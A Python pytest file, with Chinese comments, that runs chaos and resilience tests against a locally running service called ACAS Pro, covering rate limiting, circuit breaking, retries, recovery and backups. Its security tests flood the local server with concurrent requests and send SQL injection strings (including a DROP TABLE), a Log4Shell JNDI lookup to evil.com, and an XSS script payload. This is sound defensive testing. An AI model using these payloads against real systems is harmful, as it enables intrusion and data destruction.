"""ACAS Pro - 混沌测试/故障注入
验证系统容错能力和恢复能力

注意：混沌测试需要 ACAS Pro 服务运行在 localhost:8000。
手动运行: pytest tests/test_chaos.py -m chaos --run-chaos
"""
import pytest
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import requests

# Check if server is running
import socket

def _server_available(host='localhost', port=8000, timeout=2):
    try:
        with socket.create_connection((host, port), timeout):
            return True
    except (ConnectionRefusedError, socket.timeout):
        return False

pytestmark = pytest.mark.skipif(
    not _server_available(),
    reason="Chaos tests require ACAS Pro server running on localhost:8000"
)


class ChaosMonkey:
    """混沌猴子 - 故障注入器"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.disruptions = []
    
    def inject_latency(self, endpoint: str, delay_ms: int, duration_sec: int):
        """注入延迟"""
        def disrupt():
            start = time.time()
            while time.time() - start < duration_sec:
                try:
                    # 通过代理或中间件注入延迟
                    time.sleep(delay_ms / 1000)
                except Exception:
                    pass
        
        t = threading.Thread(target=disrupt)
        t.start()
        self.disruptions.append(t)
    
    def inject_error(self, endpoint: str, error_rate: float, duration_sec: int):
        """注入错误率"""
        # 通过配置中心动态调整错误率
        pass
    
    def kill_service(self, service_name: str, duration_sec: int):
        """模拟服务宕机"""
        # 需要配合容器编排工具
        pass
    
    def network_partition(self, duration_sec: int):
        """模拟网络分区"""
        pass


@pytest.mark.chaos
class TestChaosResilience:
    """混沌测试 - 系统韧性"""
    
    @pytest.fixture
    def chaos(self):
        return ChaosMonkey()
    
    def test_graceful_degradation_database_down(self, chaos):
        """数据库宕机时的优雅降级"""
        # 模拟数据库不可用
        # 系统应返回缓存数据或友好错误
        
        # 正常请求
        r1 = chaos.session.get(f"{chaos.base_url}/health")
        assert r1.status_code == 200
        
        # 模拟数据库故障后
        # 应返回 503 或降级数据
        # 实际测试需要配合数据库操作
        pytest.skip("需要数据库故障注入工具")
    
    def test_circuit_breaker_activation(self, chaos):
        """熔断器触发测试"""
        # 连续失败触发熔断
        failed_count = 0
        
        for _ in range(20):
            try:
                r = chaos.session.get(
                    f"{chaos.base_url}/api/v1/forecast",
                    timeout=1
                )
                if r.status_code >= 500:
                    failed_count += 1
            except Exception:
                failed_count += 1
        
        # 熔断后应快速失败
        start = time.time()
        r = chaos.session.get(f"{chaos.base_url}/api/v1/forecast")
        elapsed = time.time() - start
        
        # 熔断状态下响应应 < 100ms
        if failed_count >= 10:
            assert elapsed < 0.1, f"熔断响应时间 {elapsed*1000:.1f}ms >= 100ms"
    
    def test_rate_limiting_under_load(self, chaos):
        """高负载下限流生效"""
        results = []
        
        def make_request():
            try:
                r = chaos.session.post(
                    f"{chaos.base_url}/api/v1/auth/login",
                    json={"username": "test", "password": "test"},
                    timeout=5
                )
                return r.status_code
            except Exception as e:
                return 0
        
        # 100 并发请求
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(make_request) for _ in range(200)]
            for f in futures:
                results.append(f.result())
        
        # 应有部分请求被限流 (429)
        rate_limited = results.count(429)
        assert rate_limited > 0, "限流未生效"
        
        # 限流比例应在合理范围
        rate_limit_ratio = rate_limited / len(results)
        assert 0.1 < rate_limit_ratio < 0.9, f"限流比例 {rate_limit_ratio:.2%} 不合理"
    
    def test_retry_mechanism(self, chaos):
        """重试机制测试"""
        # 模拟偶发失败
        attempt_count = 0
        success = False
        max_retries = 3
        
        for attempt in range(max_retries):
            attempt_count += 1
            try:
                # 模拟 50% 失败率
                if random.random() < 0.5 and attempt < max_retries - 1:
                    raise Exception("Simulated failure")
                
                r = chaos.session.get(f"{chaos.base_url}/health", timeout=2)
                if r.status_code == 200:
                    success = True
                    break
            except Exception:
                time.sleep(0.1 * (attempt + 1))  # 指数退避
        
        assert success, f"重试 {attempt_count} 次后仍失败"
    
    def test_timeout_handling(self, chaos):
        """超时处理测试"""
        start = time.time()
        
        try:
            # 请求一个可能超时的端点
            r = chaos.session.get(
                f"{chaos.base_url}/api/v1/forecast",
                timeout=0.001  # 1ms 超时
            )
        except requests.Timeout:
            pass
        
        elapsed = time.time() - start
        
        # 超时响应应快速返回
        assert elapsed < 0.1, f"超时处理时间 {elapsed*1000:.1f}ms >= 100ms"
    
    def test_memory_leak_detection(self, chaos):
        """内存泄漏检测"""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        memory_samples = []
        
        # 执行多轮请求
        for i in range(10):
            for _ in range(100):
                chaos.session.get(f"{chaos.base_url}/health")
            
            memory = process.memory_info().rss / 1024 / 1024
            memory_samples.append(memory)
            time.sleep(0.5)
        
        # 检查内存增长趋势
        if len(memory_samples) >= 5:
            first_avg = sum(memory_samples[:3]) / 3
            last_avg = sum(memory_samples[-3:]) / 3
            growth = last_avg - first_avg
            
            # 内存增长应 < 20MB
            assert growth < 20, f"疑似内存泄漏: {growth:.1f}MB"
    
    def test_recovery_after_failure(self, chaos):
        """故障恢复测试"""
        # 先制造一些失败
        for _ in range(10):
            try:
                chaos.session.get(
                    f"{chaos.base_url}/api/v1/invalid",
                    timeout=1
                )
            except Exception:
                pass
        
        time.sleep(1)  # 等待恢复
        
        # 验证系统恢复正常
        success_count = 0
        for _ in range(10):
            try:
                r = chaos.session.get(f"{chaos.base_url}/health", timeout=5)
                if r.status_code == 200:
                    success_count += 1
            except Exception:
                pass
            time.sleep(0.1)
        
        assert success_count >= 8, f"恢复后成功率 {success_count}/10 过低"


@pytest.mark.chaos
class TestDisasterRecovery:
    """灾难恢复测试"""
    
    def test_backup_restore(self):
        """备份恢复测试"""
        # 验证备份文件可恢复
        import subprocess
        
        result = subprocess.run(
            ["bash", "-c", "./backup.sh --dry-run"],
            capture_output=True,
            text=True
        )
        
        assert result.returncode == 0, f"备份脚本失败: {result.stderr}"
    
    def test_data_consistency_after_crash(self):
        """崩溃后数据一致性"""
        # 模拟写入过程中崩溃
        # 验证数据库事务完整性
        pytest.skip("需要数据库故障注入")
    
    def test_multi_az_failover(self):
        """多可用区故障转移"""
        # 验证主备切换
        pytest.skip("需要多可用区部署")


@pytest.mark.chaos
class TestSecurityChaos:
    """安全混沌测试"""
    
    def test_ddos_resilience(self, chaos):
        """DDoS 攻击韧性"""
        results = []
        
        def attack():
            for _ in range(50):
                try:
                    r = chaos.session.get(f"{chaos.base_url}/health", timeout=2)
                    results.append(r.status_code)
                except Exception:
                    results.append(0)
        
        # 模拟 DDoS (1000 并发)
        threads = [threading.Thread(target=attack) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        # 系统应保持部分可用
        success_rate = results.count(200) / len(results)
        assert success_rate > 0.1, f"DDoS 下成功率 {success_rate:.2%} 过低"
        
        # 限流应生效
        rate_limited = results.count(429)
        assert rate_limited > 0, "DDoS 时限流未生效"
    
    def test_sql_injection_resistance(self, chaos):
        """SQL 注入抵抗"""
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "${jndi:ldap://evil.com}",
        ]
        
        for payload in payloads:
            r = chaos.session.get(
                f"{chaos.base_url}/api/v1/users",
                params={"search": payload}
            )
            
            # 不应返回 500 或泄露数据
            assert r.status_code in [200, 400, 422], f"SQL 注入可能成功: {payload[:30]}"
    
    def test_xss_protection(self, chaos):
        """XSS 防护测试"""
        xss_payload = "<script>alert('xss')</script>"
        
        r = chaos.session.post(
            f"{chaos.base_url}/api/v1/content",
            json={"title": xss_payload, "body": "test"}
        )
        
        if r.status_code == 200:
            # 验证返回内容被转义
            response_text = r.text
            assert "<script>" not in response_text, "XSS 未过滤"
